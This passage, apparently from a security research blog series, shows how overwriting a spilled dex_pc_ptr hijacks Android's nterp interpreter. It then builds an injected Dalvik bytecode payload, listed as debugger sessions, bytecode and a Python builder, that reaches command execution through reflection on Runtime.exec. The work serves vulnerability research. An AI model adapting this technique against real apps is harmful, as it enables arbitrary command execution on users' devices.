0x7c0fe666e0 │+0x00c0   0x0000007c14a867f3   // Current Instruction (INST, x23)
0x7c0fe666e8 │+0x00c8   0x0000007c87400880   // Table of bytecode handlers (IBASE, x24)
0x7c0fe666f0 │+0x00d0   0x0000007c0fe66748   // VRefs (REFS, x25)
0x7c0fe666f8 │+0x00d8   0x0000007c0fe66758   // x26 (informally: vregs)
0x7c0fe66700 │+0x00e0   0x0000007c0fe66748   // x27
0x7c0fe66708 │+0x00e8   0x0000007c0fe66770   // x28
0x7c0fe66710 │+0x00f0   0x0000007c0fe66758   // FP (x29)
0x7c0fe66718 │+0x00f8   0x0000007c87409aa0   // Return address (x30)
0x7c0fe66720 │+0x0100   0x0000007f27664440   // ArtMethod* &lt;---- END OF NTERP FRAME
0x7c0fe66728 │+0x0108   0x0000007f276071e0   // ArtMethod*
0x7c0fe66730 │+0x0110   0x0000007c147a62a8   // Alignment? may be a dex pc
0x7c0fe66738 │+0x0118   0x0000007c147a64be   // dex_pc_ptr
0x7c0fe66740 │+0x0120   0x0000007c0fe66770   // Caller Frame Pointer (FP)
0x7c0fe66748 │+0x0128   0x0000000000000000   // Vrefs
0x7c0fe66750 │+0x0130   0x12f8084800000000   
0x7c0fe66758 │+0x0138   0x0000000000000200   // Vregs
0x7c0fe66760 │+0x0140   0x12f8084800130000
</code></pre><p>Surprisingly, the JNI frame is slightly modified, as the above instance does not contain spilled floating point registers <code>d0</code> to <code>d7</code>. However, as the <a href=https://android.googlesource.com/platform/art/+/refs/tags/android-13.0.0_r78/runtime/arch/arm64/quick_entrypoints_arm64.S#1710 target=_blank rel=noopener>comment</a>
in the JNI frame states, only a <em>generic</em> JNI frame is described, not concrete frames for every possible invocation scenario. An interesting observation is that <a href=https://github.com/hugsy/gef target=_blank rel=noopener><code>gef</code></a>
claims the canary is <code>0xe009ee421ed97f00</code>, but the disassembly of <code>writeIndexed</code> suggests the canary is <code>0x66f0649020037d8d</code>. Apparently, Android&rsquo;s Bionic library uses <a href=https://d-nb.info/1179057201/34 target=_blank rel=noopener>random canaries</a>
, which also seems to apply to Android&rsquo;s runtime. Further, there are two instances of a <code>dex_pc_ptr</code>! From top to bottom, the first one is part of the spilled registers in the JNI frame, so it will be put back into <code>x22</code> upon return to the calling method. The second one seems to be stored and managed in the <code>nterp</code> frame. Maybe this is used to ensure that <code>x22</code> can be restored on function invocations where <code>x22</code> is not spilled.</p><p>Lets verify that bytecode execution continues at whatever value is stored in the <em>spilled</em> <code>x22</code> on the stack. Basically, we can overwrite the value with something arbitrary, like <code>0x4242424242424242</code>!</p><pre tabindex=0><code>gef➤  set *(unsigned long long*)0x0000007c0fe666d8=0x4242424242424242
gef➤  c                                                                                              
Continuing.                                                                                          
                                                                                                     
Thread 20 &#34;Thread-2&#34; received signal SIGSEGV, Segmentation fault.                                    
...
$x22 : 0x4242424242424242 (&#34;BBBBBBBB&#34;?)
...
→ 0x7c87409ac0 &lt;nterp_helper+1984&gt; ldrh   w23,  [x22,  #6]!         // x23 = xINST (next opcode)
  0x7c87409ac4 &lt;nterp_helper+1988&gt; and    x16,  x23,  #0xff         // x16 = first byte of next instruction
  0x7c87409ac8 &lt;nterp_helper+1992&gt; add    x16,  x24,  x16,  lsl #7  // x16 = IBASE + opcode * &lt;bytecode handler size&gt;
  0x7c87409acc &lt;nterp_helper+1996&gt; br     x16                       // branch to handler
</code></pre><p>So, <code>nterp</code> tries to use the <em>spilled register</em> value to derive the next bytecode instruction. Thus, overwriting this value enables an attacker to redirect bytecode control - flow to any location. Most importantly, bytecode execution can be pivoted to a controlled location. In this case: the stack. Of course, either the <code>dex_pc_ptr</code> must be set to <code>addr_payload-6</code> or the first three instructions should be <code>NOP</code>s to account for the added <code>6</code> in the faulting instruction, i.e. the size of the <code>invoke-static</code> instruction used to invoke <code>writeIndexed</code>.</p><p>With the ability to control <em>where</em> <code>nterp</code> continues execution, it remains to figure out <em>what</em> to execute.</p><h3 id=building-a-bytecode-payload>Building a Bytecode Payload</h3><p>First of all, the goal must be clarified. In this case, the goal is <em>command execution</em> in the context of the vulnerable app using only bytecode. However, gaining native code execution using bytecode as intermediate stage to set up e.g. the stack is also possible. <em>Command execution</em> is chosen, because it involves calling at least one legitimate method. Therefore, showing that command execution is possible also proves that bytecode injection is capable of invoking <em>normal</em> library or application - specific methods, despite coming from a <em>memory error</em>. For simplicity, we try to get the following Java code directly in bytecode.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=s>&#34;log Hello&#34;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></div><p>Naively translating this to bytecode, e.g. by creating a PoC app, building it and decompiling the <code>.apk</code> file or using <a href=https://developer.android.com/tools/d8 target=_blank rel=noopener>d8</a>
, yields the first payload version.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>classes.dex&gt; list methods --regex Runtime::getRuntime
</span></span><span class=line><span class=cl><span class=o>[</span><span class=nv>Offset</span> <span class=o>=</span> 0x0<span class=o>]</span>: classes.dex
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa254<span class=o>]</span>: Runtime Runtime::getRuntime<span class=o>()</span>
</span></span><span class=line><span class=cl>classes.dex&gt; list methods --regex <span class=s2>&#34;MainActivity::simpleShellcode&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span><span class=nv>Offset</span> <span class=o>=</span> 0x0<span class=o>]</span>: classes.dex
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa097, <span class=nv>Offset</span> <span class=o>=</span> 0x363638, Num <span class=nv>Regs</span> <span class=o>=</span> 0x2<span class=o>]</span>:
</span></span><span class=line><span class=cl>        private void MainActivity::simpleShellcode<span class=o>()</span>
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa097<span class=o>]</span>:
</span></span><span class=line><span class=cl>        void MainActivity::simpleShellcode<span class=o>()</span>
</span></span><span class=line><span class=cl>classes.dex&gt; decompile method --index 0xa097
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa097, <span class=nv>Offset</span> <span class=o>=</span> 0x363638, Num <span class=nv>Regs</span> <span class=o>=</span> 0x2<span class=o>]</span>:
</span></span><span class=line><span class=cl>    private void MainActivity::simpleShellcode<span class=o>()</span>
</span></span><span class=line><span class=cl>        0000: INVOKE_STATIC <span class=o>{}</span>, METHOD:LRuntime<span class=p>;</span>-&gt;getRuntime<span class=o>()</span>LRuntime<span class=p>;</span>
</span></span><span class=line><span class=cl>        0006: MOVE_RESULT_OBJECT v1
</span></span><span class=line><span class=cl>        0008: CONST_STRING v0, STRING:<span class=s2>&#34;log Hello&#34;</span><span class=o>(</span>14<span class=o>)</span>
</span></span><span class=line><span class=cl>        000c: INVOKE_VIRTUAL <span class=o>{</span>v1, v0<span class=o>}</span>, METHOD:LRuntime<span class=p>;</span>-&gt;exec<span class=o>(</span>LString<span class=p>;</span><span class=o>)</span>LProcess<span class=p>;</span>
</span></span><span class=line><span class=cl>        0012: RETURN_VOID 
</span></span></code></pre></div><p>With such a payload at hand, one may be tempted to copy it over and try it! However, as another app is used to construct this payload, most certainly type and method indices are incorrect. An example is that <code>invoke-static</code> invokes the <code>Runtime::getRuntime</code> method with index <code>0xa254</code>. From a <a href=#sample-app>previous section</a>
it is known that the sample app uses <code>Runtime::getRuntime</code> with index <code>0xa6ee</code>. Therefore, these indices are incompatible. The same holds for the <code>String</code> constant <code>"log Hello"</code>. Most certainly the vulnerable app does not even contain such a <code>String</code> constant! Therefore, to get command execution using <code>Runtime.getRuntime().exec("...")</code>, we need to construct a payload that is more dynamic. To that end, we strive for the following properties:</p><ul><li>dynamic <code>String</code> instances</li><li>dynamic method invocation</li></ul><p>Using a different app is helpful to get the overall payload layout and avoids having to deal with e.g. register allocations. However, a context is often app - specific, which must be considered during payload construction.</p><h4 id=dynamic-strings>Dynamic Strings</h4><p>As discussed in a previous blog post, the instruction <code>fill-array-data</code> can be used to fill an array with data directly located inside the bytecode. So, long story short, an arbitrary <code>char[]</code> can be constructed using <code>fill-array-data</code>. For this to work, an attacker needs to know the type index of a <code>char[]</code>. Luckily, the <code>char[]</code> type is used frequently, so it most likely resides in any <code>.dex</code> we encounter. For a start the payload looks like below:</p><pre tabindex=0><code>new-array v0, &lt;length&gt;, char[]
fill-array-data v0, +&lt;byte offset//2&gt;
...
[fill-array-data-payload]
ident=0x0300
element_width=0x2
size=len(command)
data=[ command[0], ..., command[-1] ]
</code></pre><p>From now on, assume an attacker has a <code>char[]</code> instance describing a command, like <code>"log Hello"</code>. The next step is to construct a <code>String</code> from a <code>char[]</code>. On Android, <code>StringBuilder</code> is the type of choice. Again, it is used so frequently that every <code>.dex</code> file is expected to contain the corresponding type. The main challenge is whether <code>StringBuilder::append(char[])</code> exists. In case of the vulnerable app it does, but it may not be the case for another app. If there is no way to construct a <code>String</code> from bytecode, an attacker can also <em>inject</em> a fake <code>String</code> object (see next post regarding bytecode reuse). Continuing with the <code>StringBuilder</code>, consider the following analysis:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>classes.dex&gt; list types --regex <span class=s2>&#34;StringBuilder&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0x150f<span class=o>]</span>: StringBuilder
</span></span><span class=line><span class=cl>classes.dex&gt; list methods --regex <span class=s2>&#34;StringBuilder::append&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa750<span class=o>]</span>: StringBuilder StringBuilder::append<span class=o>([</span>C<span class=o>)</span>
</span></span><span class=line><span class=cl>classes.dex&gt; list methods --regex <span class=s2>&#34;StringBuilder::&lt;init&gt;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa741<span class=o>]</span>: void StringBuilder::&lt;init&gt;<span class=o>()</span>
</span></span><span class=line><span class=cl>classes.dex&gt; list methods --regex <span class=s2>&#34;StringBuilder::toString&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa75d<span class=o>]</span>: String StringBuilder::toString<span class=o>()</span>
</span></span></code></pre></div><p>As the name suggests, <code>StringBuilder::&lt;init>()</code> is the constructur of <code>StringBuilder</code> that does not take any parameters. In Java, invoking this constructor is done via <code>new StringBuilder()</code>. Overall, the following Java snippet describes what we try to do directly in bytecode:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kt>char</span><span class=o>[]</span><span class=w> </span><span class=n>c</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>char</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=sc>&#39;l&#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;o&#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;g&#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39; &#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;H&#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;e&#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;l&#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;l&#39;</span><span class=p>,</span><span class=w> </span><span class=sc>&#39;o&#39;</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>StringBuilder</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>b</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>c</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>String</span><span class=w> </span><span class=n>command</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=na>toString</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></div><p>Putting together all the pieces and equipped with the <a href=https://source.android.com/docs/core/runtime/dalvik-bytecode#instructions target=_blank rel=noopener>bytecode documentation</a>
and a sample app for payload creation, the following bytecode can be constructed:</p><pre tabindex=0><code>0000: CONST_16 v0, #+&lt;len(command)&gt;
0004: NEW_ARRAY v0, v0, TYPE:char[]
0008: FILL_ARRAY_DATA v0, +&lt;offset to command data // 2&gt;
000e: NEW_INSTANCE v1, TYPE:StringBuilder
0012: INVOKE_DIRECT {v1}, METHOD:StringBuilder-&gt;&lt;init&gt;()
0018: INVOKE_VIRTUAL {v1, v0}, METHOD:StringBuilder-&gt;append(char[])
001e: INVOKE_VIRTUAL {v1}, METHOD:StringBuilder-&gt;toString()
0024: MOVE_RESULT_OBJECT v2
...
offset command data: [fill-array-data-payload]
</code></pre><p>After the above bytecode is executed, <code>v2</code> contains a reference to a <code>String</code> object with contents <code>"log Hello"</code>. Notice that this bytecode is independent of the String&rsquo;s semantics, i.e. this is a generic approach for constructing a <code>String</code> instance from a <code>char[]</code> and not specific to a system command! The only components that need to change for a new String are length fields and the array contents. Of course, one may have to use new vregs to prevent existing vregs from being clobbered.</p><blockquote><p><em>Note</em>: Calling the constructor on a newly created instance is sometimes <em>optional</em>. If the goal is to create a valid object, then one may only use <code>new-instance</code>, which means the index of the constructor method can be ignored. Of course, using the object later on may cause unexpected behaviour, including crashes.</p></blockquote><h5 id=problem-with-string-constructors>Problem with String Constructors</h5><p>One might ask why <code>StringBuilder::append(char[])</code> is preferred over <code>String::&lt;init>(char[])</code>. This is motivated by the fact that <code>String</code>s are <a href=https://android.googlesource.com/platform/libcore/+/refs/tags/android-13.0.0_r78/ojluni/src/main/java/java/lang/String.java#223 target=_blank rel=noopener><em>disabled</em></a>
on Android. At least the source code suggests that <code>StringFactory</code> should be used instead of the <code>String</code> type directly:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=nf>String</span><span class=p>(</span><span class=kt>char</span><span class=w> </span><span class=n>value</span><span class=o>[]</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// BEGIN Android-changed: Implemented as compiler and runtime intrinsics.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>    this(value, 0, value.length, null);
</span></span></span><span class=line><span class=cl><span class=cm>            */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>UnsupportedOperationException</span><span class=p>(</span><span class=s>&#34;Use StringFactory instead.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// END Android-changed: Implemented as compiler and runtime intrinsics.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>Therefore, we directly use the <code>StringBuilder</code> type, also because it is used frequently and easy to use. Notice that although <code>String</code> constructors cannot be easily used, this does not imply that the <code>String</code> type occurs less frequently!</p><h4 id=dynamic-method-invocation>Dynamic Method Invocation</h4><p>The problem to solve is as follows. Goal is to call <code>Runtime.getRuntime().exec(command)</code>, but it cannot be assumed that the context of the bytecode provides the method indices for <code>getRuntime</code> and <code>exec</code>. Actually, <code>Runtime.getRuntime()</code> is very common, because it occurs in the context, although the method and <code>Runtime</code> type are not explicitly used in the vulnerable app:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>classes.dex&gt; list types --regex <span class=s2>&#34;Runtime&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0x1507<span class=o>]</span>: Runtime
</span></span><span class=line><span class=cl>classes.dex&gt; list methods --regex <span class=s2>&#34;Runtime::getRuntime&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>[</span><span class=nv>Index</span> <span class=o>=</span> 0xa6ee<span class=o>]</span>: Runtime Runtime::getRuntime<span class=o>()</span>
</span></span><span class=line><span class=cl>classes.dex&gt; list methods --regex <span class=s2>&#34;Runtime::exec&#34;</span>
</span></span><span class=line><span class=cl>classes.dex&gt; 
</span></span></code></pre></div><p>Unfortunately, <code>Runtime::exec</code> is not very common. Luckily, Java provides a feature called <em>reflection</em>. Obviously, the name of the function to be invoked is known, i.e. <code>"exec"</code>. So, in Java, dynamically resolving the method looks like so:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredMethod</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w> </span><span class=o>[</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=o>]</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></div><p>As can be seen in the above examples, including dynamic <code>String</code> creation, successful bytecode creation involves a lot of creativity and thinking out - of - the - box to find semantically fitting bytecode instruction sequences that use as few context - specific resources as possible. While it is possible to use Java code to construct the initial bytecode layout, indices etc. must be adjusted to fit the context. Bytecode generated from Java code may use e.g. types that are not available in the context.</p><p>The <code>String</code> type is also very common, so it can be assumed to be available in all <code>.dex</code> files and thus in every context an attacker encounters. With all that, the bytecode can be seen below. Notice that <code>v6 := "exec"</code>.</p><pre tabindex=0><code>003a: INVOKE_STATIC {}, METHOD:Runtime-&gt;getRuntime()
0040: MOVE_RESULT_OBJECT v4
0042: INVOKE_VIRTUAL {v4}, METHOD:Object-&gt;getClass()
0048: MOVE_RESULT_OBJECT v5
0052: CONST_4 v7, #+1
0054: NEW_ARRAY v7, v7, TYPE:[Class
0058: CONST_4 v8, #+0
005a: CONST_CLASS v9, TYPE:String
005e: APUT_OBJECT v9, v7, v8
0062: INVOKE_VIRTUAL {v5, v6, v7}, METHOD:Class-&gt;getDeclaredMethod(String,Class[])
</code></pre><p>An alternative approach may be to use <code>Runtime.class.getDeclaredMethod(...)</code>. However, we need the instance of <code>Runtime</code> for invocation of <code>exec</code>. This approach may save us the <code>getClass</code> invocation, although this would most likely be replaced with an equivalent instruction.</p><p>What is left to do is to invoke the resolved method. Of course, invocation depends on what parameters the target method expects. The below code snippet continues with calling <code>exec</code>.</p><pre tabindex=0><code>0068: MOVE_RESULT_OBJECT v5
006a: v6 := &#34;log Hello&#34; ...
0072: FILLED_NEW_ARRAY {v6}, TYPE:[LObject;
0078: MOVE_RESULT_OBJECT v6
007a: INVOKE_VIRTUAL {v5, v4, v6}, METHOD:LMethod;-&gt;invoke(LObject;,[LObject;)
</code></pre><p>For simplicity, I omitted the creation of the <code>"log Hello"</code> command.</p><p>Observe that dynamically invoking methods using reflection requires knowledge of specific type and method indices, among which are:</p><ul><li><code>Class[]</code>, <code>String</code> and <code>Object[]</code> type indices</li><li><code>Runtime::getRuntime()</code>, <code>Object::getClass()</code>, <code>Class::getDeclaredMethod(String, Class[])</code> and <code>Method::invoke(Object, Object[])</code> method indices</li></ul><p>With the above approaches, i.e. dynamic strings and method invocations, it is possible to get command execution using only bytecode from a memory error in a vulnerable app. Or so you may think, but the execution environment is cruel, especially as regards vreg allocations!</p><h4 id=limited-dynamic-vregs>Limited, dynamic Vregs</h4><p>A method specifies the amount of vregs needed to work in its associated <a href=https://source.android.com/docs/core/runtime/dex-format#code-item target=_blank rel=noopener><code>code_item</code></a>
. When executing a method, <code>nterp</code> allocates as many vregs (and vrefs) as specified on the stack. Now, what happens if the hijacked method requested <code>4</code> vregs, but the payload uses <code>10</code>? As has been discussed in a previous blog post, vregs and vrefs have the following properties:</p><ol><li>Vrefs array precedes vregs array on stack.</li><li>Vrefs array is adjacent to vregs array.</li><li>Vrefs and vregs are parallel and entries are semantically linked. For example, vreg <code>v0</code> is linked to vref <code>r0</code>.</li><li>Vrefs and vregs array accesses are not bounds - checked.</li></ol><p>Continuing the example, accessing vregs <code>v0</code> to <code>v3</code> is legitimate. However, accessing <code>v4</code> is problematic. In case the access to <code>v4</code> is a write, then <code>r4</code> will most likely also be overwritten. The problem is that <code>r4</code> accesses the first value after the actual vrefs array, i.e. <code>v0</code>. Therefore, if something is stored into <code>v0</code> and then e.g. a constant is written to <code>v4</code>, then <code>v0</code> will be modified, in this case set to <code>0</code>. Also, the first 32-bit value after vregs is changed to be the constant assigned to <code>v4</code>. This has the neat side - effect that an attacker can fully read and write stack values located after vrefs and vregs, enabling attacks like JITROP. From a bytecode perspective, depending on the amount of registers used in the payload, this is problematic, because registers holding important data like <code>Runtime</code> instance may be clobbered.</p><p>This is where <em>math</em> can save the day! Say the hijacked method requested <code>N</code> vregs. Then, the first overlap happens at <code>v&lt;N></code>, because this may also set <code>r&lt;N></code>, which overlaps with <code>v0</code>. So, to prevent overflowing into the vregs, an access to <code>v&lt;N></code> can be set to <code>v&lt;N+N></code>. This skips over the entire vregs array, and thus reinterprets the region after vregs as a fresh vrefs - vregs array pair. Hence, the mapping is <code>N -> N+N</code>, but what happens in case <code>v&lt;N+1></code> or <code>v&lt;N+2></code> are accessed? And what about <code>v&lt;N+N+N+2></code>? To resolve this problem, observe that each <em>block</em>, i.e. vregs accesses that do <strong>not</strong> overflow into the following block, is of size <code>N * 2</code>. The first block consists of the original vrefs and vregs, in that order, each of length <code>N</code>. Say the payload needs <code>M</code> vregs to work. Then the number of blocks is <code>k := M // N + 1</code>, where <code>//</code> is <em>integer - division</em>. Also, for a vreg index <code>X</code>, compute the offset into a block as <code>X % N</code>. Now, if vreg <code>v&lt;X></code> with <code>0 &lt;= X &lt; M</code> is to be accessed, then compute block id <code>X // N</code> and offset <code>X % N</code>. The actual vreg access is then <code>v&lt;(X // N) * (N * 2) + (X % N)></code>. To summarize,</p><ul><li><code>X // N</code>: Block id</li><li><code>N * 2</code>: Block size in register entries</li><li><code>X % N</code>: Offset within a block</li></ul><p>Consider the following visualization for the case where the payload uses <code>10</code> vregs, the hijacked method only allocated memory for <code>4</code> vregs, and the payload tries to access vreg <code>v4</code>. Of course, whatever data overlaps with the <em>artificial</em> blocks is corrupted. Hence, care must be taken when using this approach. Luckily, blocks can be shifted up the stack until no critical data is overwritten.<div class=not-prose><figure><img src=/2024/09/bytecode_exploitation_2_dynamic_vreg_example.png alt="Dynamic Vregs Example" loading=lazy></figure></div></p><p>With a simple function, this can be abstracted away, so we never have to do math again:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=n>v</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>i</span><span class=p>:</span> <span class=p>(</span><span class=n>i</span> <span class=o>//</span> <span class=n>available_vregs</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=mi>2</span> <span class=o>*</span> <span class=n>available_vregs</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>i</span> <span class=o>%</span> <span class=n>available_vregs</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>v0</span> <span class=o>=</span> <span class=n>v</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>v1</span> <span class=o>=</span> <span class=n>v</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>v2</span> <span class=o>=</span> <span class=n>v</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>v3</span> <span class=o>=</span> <span class=n>v</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>v4</span> <span class=o>=</span> <span class=n>v</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span></code></pre></div><h4 id=the-payload>The Payload</h4><p>Finally, with all caveats aside, the final payload can be constructed. It is beneficial to implement a <a href=https://github.com/fkie-cad/Android-Bytecode-Exploitation/blob/main/bytecode-injection/bcbuilder.py#L12 target=_blank rel=noopener><code>BytecodeBuilder</code></a>
, which dynamically builds bytecode based on the <a href=https://source.android.com/docs/core/runtime/dalvik-bytecode target=_blank rel=noopener>documentation</a>
. This eases testing and constructing different kinds of payloads! In this case study, the payload can be fully expressed like below. Note that the comments do not always show the correct indices, lengths and offsets. Most of these values are computed dynamically or change with the payload size and layout. Also, another app is used to generate the payload layout and avoid having to deal with register allocations. The app is forced to use the <em>tricks</em> for dynamic strings and method invocations on Java - level.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>builder</span> <span class=o>=</span> <span class=n>BytecodeBuilder</span><span class=p>(</span><span class=n>type_map</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;char[]&#39;</span><span class=p>:</span> <span class=n>char_array_index</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;StringBuilder&#39;</span><span class=p>:</span> <span class=n>stringbuilder_index</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;Class[]&#39;</span><span class=p>:</span> <span class=n>classarray_index</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;String&#39;</span><span class=p>:</span> <span class=n>string_index</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;Object[]&#39;</span><span class=p>:</span> <span class=n>objectarray_index</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;Object&#39;</span><span class=p>:</span> <span class=n>object_index</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># [Index = 0x5, Offset = 0x31c, Num Regs = 0xa]: private static void com/poc/shellcode/MainActivity::shellcode()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>builder</span>
</span></span><span class=line><span class=cl><span class=c1># 0000: 13 00 12 00       CONST_16 v0, #+18</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>const_16</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>command</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># 0004: 23 00 13 00       NEW_ARRAY v0, v0, TYPE:[C</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>new_array</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=n>v0</span><span class=p>,</span> <span class=s1>&#39;char[]&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0008: 26 00 3e 00 00 00 FILL_ARRAY_DATA v0, +62</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>fill_array_data</span><span class=p>(</span><span class=n>v0</span><span class=p>,</span> <span class=mi>65</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 000e: 22 01 0d 00       NEW_INSTANCE v1, TYPE:Ljava/lang/StringBuilder;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>new_instance</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=s1>&#39;StringBuilder&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0012: 70 10 0b 00 01 00 INVOKE_DIRECT {v1}, METHOD:Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>invoke_direct</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>stringbuilder_constructor_index</span><span class=p>,</span> <span class=p>[</span><span class=n>v1</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 0018: 6e 20 0c 00 01 00 INVOKE_VIRTUAL {v1, v0}, METHOD:Ljava/lang/StringBuilder;-&gt;append([C)Ljava/lang/StringBuilder;</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>invoke_virtual</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>stringbuilder_append_chararray_index</span><span class=p>,</span> <span class=p>[</span><span class=n>v1</span><span class=p>,</span> <span class=n>v0</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=c1># 001e: 12 42             CONST_4 v2, #+4</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>const_16</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0020: 23 22 13 00       NEW_ARRAY v2, v2, TYPE:[C</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>new_array</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span> <span class=n>v2</span><span class=p>,</span> <span class=s1>&#39;char[]&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 0024: 26 02 46 00 00 00 FILL_ARRAY_DATA v2, +70</span>
</span></span><span class=line><span class=cl>        <span class=o>.</span><span class=n>fill_array_data</span><span class=p>(</span><span class=n>v2</span><span class=p>,</span> <span class=mi>65</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 002a: 22 03 0d 00       NEW_INSTANCE v3, TYPE:Ljava/lang/StringBuilder;</span>
